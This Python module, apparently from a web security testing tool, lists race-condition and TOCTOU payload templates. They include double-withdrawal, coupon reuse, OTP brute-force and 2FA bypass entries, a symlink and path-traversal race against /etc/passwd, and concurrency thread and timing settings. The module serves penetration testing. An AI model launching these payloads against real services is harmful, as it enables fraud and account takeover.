"""
Race Condition Payloads

Payloads for time-of-check-time-of-use (TOCTOU) and race condition attacks including:
- Concurrent request attacks
- Resource competition
- State manipulation
"""

# Coupon/balance manipulation race conditions
COUPON_RACE_PAYLOADS = [
    {
        "name": "coupon_reuse",
        "payload": {"coupon": "SAVE20", "quantity": 1},
        "description": "Coupon reuse race condition",
        "race": "concurrent_use",
    },
    {
        "name": "coupon_stack",
        "payload": {"coupons": ["SAVE10", "SAVE20", "SAVE30"]},
        "description": "Coupon stacking attack",
        "race": "concurrent_apply",
    },
]

# Balance/transfer race conditions
BALANCE_RACE_PAYLOADS = [
    {
        "name": "double_withdrawal",
        "payload": {"amount": 100, "action": "withdraw"},
        "description": "Double withdrawal attack",
        "race": "concurrent_withdraw",
    },
    {
        "name": "negative_balance",
        "payload": {"amount": -100, "action": "transfer"},
        "description": "Negative balance manipulation",
        "race": "balance_manipulation",
    },
    {
        "name": "transfer_race",
        "payload": {"transfer_to": "hacker", "amount": 100},
        "description": "Transfer race condition",
        "race": "concurrent_transfer",
    },
]

# ID creation/enumeration race conditions
ID_CREATION_RACE = [
    {
        "name": "concurrent_id",
        "payload": {"create_order": True},
        "description": "Consecutive ID creation",
        "race": "predictable_ids",
    },
    {
        "name": "uid_race",
        "payload": {"register": True},
        "description": "UID enumeration race",
        "race": "uid_prediction",
    },
]

# Password reset token race conditions
PASSWORD_RESET_RACE = [
    {
        "name": "token_reuse",
        "payload": {"token": "valid_token", "new_password": "hacked"},
        "description": "Password reset token reuse",
        "race": "token_reuse",
    },
    {
        "name": "concurrent_reset",
        "payload": {"email": "victim@target.com"},
        "description": "Concurrent reset requests",
        "race": "concurrent_reset",
    },
]

# Email verification race conditions
EMAIL_VERIFY_RACE = [
    {
        "name": "skip_verification",
        "payload": {"email_verified": True},
        "description": "Email verification bypass",
        "race": "verification_bypass",
    },
    {
        "name": "token_guess_race",
        "payload": {"verification_code": "123456"},
        "description": "Verification code guessing",
        "race": "brute_force_verify",
    },
]

# Resource booking/reservation race conditions
BOOKING_RACE = [
    {
        "name": "overbooking",
        "payload": {"book": True, "quantity": 999},
        "description": "Resource overbooking",
        "race": "resource_exhaustion",
    },
    {
        "name": "double_book",
        "payload": {"book": True, "item": "premium_item"},
        "description": "Double booking attack",
        "race": "concurrent_book",
    },
]

# Voting/like manipulation race conditions
VOTE_RACE = [
    {
        "name": "vote_stacking",
        "payload": {"vote": True, "option": "evil"},
        "description": "Vote stacking",
        "race": "concurrent_vote",
    },
    {
        "name": "like_bomb",
        "payload": {"like": True, "target": "victim_post"},
        "description": "Like bomb attack",
        "race": "like_manipulation",
    },
]

# Cart manipulation race conditions
CART_RACE = [
    {
        "name": "price_race",
        "payload": {"item_id": 1, "quantity": 1},
        "description": "Price manipulation via race",
        "race": "price_freeze",
    },
    {
        "name": "coupon_race_cart",
        "payload": {"cart_id": 123, "coupon": "RACE20"},
        "description": "Cart coupon race",
        "race": "coupon_cart_race",
    },
]

# Timing-based race payloads
TIMING_ATTACKS = [
    {
        "name": "check_use_gap",
        "payload": {"check_only": True},
        "description": "Check without use TOCTOU",
        "race": "check_use_gap",
    },
    {
        "name": "fast_submit",
        "payload": {"fast_submit": True},
        "description": "Fast submission race",
        "race": "speed_race",
    },
]

# Race parameter patterns
RACE_PARAMETERS = [
    "coupon",
    "promo_code",
    "discount",
    "amount",
    "balance",
    "withdraw",
    "transfer",
    "quantity",
    "price",
    "vote",
    "like",
    "book",
    "reserve",
    "token",
    "reset_token",
    "verification_code",
]

# Success indicators for race conditions
RACE_SUCCESS_INDICATORS = [
    "applied twice",
    "duplicate",
    "already used",
    "success",
    "completed",
    "accepted",
    "confirmed",
]

# File-based TOCTOU (Time-of-Check-Time-of-Use)
FILE_TOCTOU = [
    {
        "name": "symlink_race",
        "payload": {"file": "/tmp/safe.txt", "symlink_to": "/etc/passwd"},
        "description": "Symlink race condition",
        "race": "symlink_switch",
        "timing_window_ms": 50,
    },
    {
        "name": "temp_file_race",
        "payload": {"temp_file": "/tmp/upload_XXXXX"},
        "description": "Predictable temp file race",
        "race": "temp_file_prediction",
        "timing_window_ms": 100,
    },
    {
        "name": "permission_check_race",
        "payload": {"check_file": "/tmp/test.txt", "action": "read"},
        "description": "Permission check vs file access race",
        "race": "permission_toctou",
        "timing_window_ms": 50,
    },
    {
        "name": "directory_traversal_race",
        "payload": {"path": "/uploads/../../../etc/passwd"},
        "description": "Path validation race",
        "race": "path_validation",
        "timing_window_ms": 50,
    },
]

# Session fixation and manipulation races
SESSION_RACE = [
    {
        "name": "session_fixation",
        "payload": {"session_id": "attacker_controlled_session"},
        "description": "Session fixation race",
        "race": "session_fixation",
        "timing_window_ms": 100,
    },
    {
        "name": "concurrent_login",
        "payload": {"username": "victim", "action": "login"},
        "description": "Concurrent login session race",
        "race": "concurrent_auth",
        "timing_window_ms": 200,
    },
    {
        "name": "session_upgrade",
        "payload": {"upgrade_to": "admin", "concurrent": True},
        "description": "Session privilege upgrade race",
        "race": "privilege_upgrade",
        "timing_window_ms": 100,
    },
    {
        "name": "logout_race",
        "payload": {"action": "logout", "concurrent_action": "transfer"},
        "description": "Logout vs action race",
        "race": "logout_action",
        "timing_window_ms": 50,
    },
]

# Database transaction races
DATABASE_RACE = [
    {
        "name": "isolation_bypass",
        "payload": {"transaction": "read_uncommitted"},
        "description": "Transaction isolation level bypass",
        "race": "dirty_read",
        "timing_window_ms": 100,
    },
    {
        "name": "phantom_read",
        "payload": {"query": "SELECT", "concurrent_insert": True},
        "description": "Phantom read race condition",
        "race": "phantom_read",
        "timing_window_ms": 150,
    },
    {
        "name": "lost_update",
        "payload": {"update_field": "balance", "concurrent": True},
        "description": "Lost update race condition",
        "race": "lost_update",
        "timing_window_ms": 100,
    },
    {
        "name": "deadlock_trigger",
        "payload": {"resource_a": "lock", "resource_b": "lock"},
        "description": "Deadlock triggering race",
        "race": "deadlock",
        "timing_window_ms": 200,
    },
]

# Distributed lock bypass
DISTRIBUTED_LOCK_RACE = [
    {
        "name": "lock_expiry_race",
        "payload": {"lock_id": "resource_lock", "wait_for_expiry": True},
        "description": "Lock expiry race condition",
        "race": "lock_expiry",
        "timing_window_ms": 1000,
    },
    {
        "name": "redis_lock_race",
        "payload": {"key": "lock:resource", "action": "SETNX"},
        "description": "Redis distributed lock race",
        "race": "redis_lock",
        "timing_window_ms": 50,
    },
    {
        "name": "optimistic_lock_race",
        "payload": {"version": 1, "concurrent_update": True},
        "description": "Optimistic locking bypass",
        "race": "optimistic_lock",
        "timing_window_ms": 100,
    },
]

# Inventory/stock race conditions
INVENTORY_RACE = [
    {
        "name": "oversell_race",
        "payload": {"item_id": 1, "quantity": 1, "stock": 1},
        "description": "Overselling last item in stock",
        "race": "oversell",
        "timing_window_ms": 50,
        "recommended_threads": 10,
    },
    {
        "name": "flash_sale_race",
        "payload": {"item_id": "limited_edition", "quantity": 1},
        "description": "Flash sale item race",
        "race": "flash_sale",
        "timing_window_ms": 100,
        "recommended_threads": 50,
    },
    {
        "name": "cart_reservation_race",
        "payload": {"cart_id": 123, "reserve": True},
        "description": "Cart item reservation race",
        "race": "cart_reserve",
        "timing_window_ms": 200,
        "recommended_threads": 5,
    },
]

# OTP/2FA race conditions
OTP_RACE = [
    {
        "name": "otp_reuse",
        "payload": {"otp": "123456", "reuse": True},
        "description": "OTP reuse race condition",
        "race": "otp_reuse",
        "timing_window_ms": 50,
        "recommended_threads": 5,
    },
    {
        "name": "otp_brute_race",
        "payload": {"otp_range": range(0, 999999)},
        "description": "OTP brute force race",
        "race": "otp_brute",
        "timing_window_ms": 1000,
        "recommended_threads": 100,
    },
    {
        "name": "2fa_bypass_race",
        "payload": {"skip_2fa": True, "concurrent_auth": True},
        "description": "2FA bypass via race",
        "race": "2fa_bypass",
        "timing_window_ms": 100,
        "recommended_threads": 10,
    },
]

# API rate limiting race
RATE_LIMIT_RACE = [
    {
        "name": "rate_limit_burst",
        "payload": {"requests": 100, "burst": True},
        "description": "Rate limit burst bypass",
        "race": "rate_burst",
        "timing_window_ms": 1000,
        "recommended_threads": 100,
    },
    {
        "name": "sliding_window_race",
        "payload": {"window_boundary": True},
        "description": "Sliding window boundary race",
        "race": "window_boundary",
        "timing_window_ms": 100,
        "recommended_threads": 50,
    },
]

# Recommended concurrent thread counts
RACE_THREAD_RECOMMENDATIONS = {
    "low": 5,       # For sensitive operations
    "medium": 20,   # General purpose
    "high": 50,     # For flash sales, etc.
    "extreme": 100, # For rate limit testing
}

# Timing windows by race type (in milliseconds)
TIMING_WINDOWS = {
    "file_operations": 50,
    "database": 100,
    "session": 100,
    "payment": 50,
    "inventory": 100,
    "otp": 50,
    "rate_limit": 1000,
}

# Combined payload list for easy iteration
ALL_RACE_PAYLOADS = (
    COUPON_RACE_PAYLOADS +
    BALANCE_RACE_PAYLOADS +
    ID_CREATION_RACE +
    PASSWORD_RESET_RACE +
    EMAIL_VERIFY_RACE +
    BOOKING_RACE +
    VOTE_RACE +
    CART_RACE +
    TIMING_ATTACKS +
    FILE_TOCTOU +
    SESSION_RACE +
    DATABASE_RACE +
    DISTRIBUTED_LOCK_RACE +
    INVENTORY_RACE +
    OTP_RACE +
    RATE_LIMIT_RACE
)
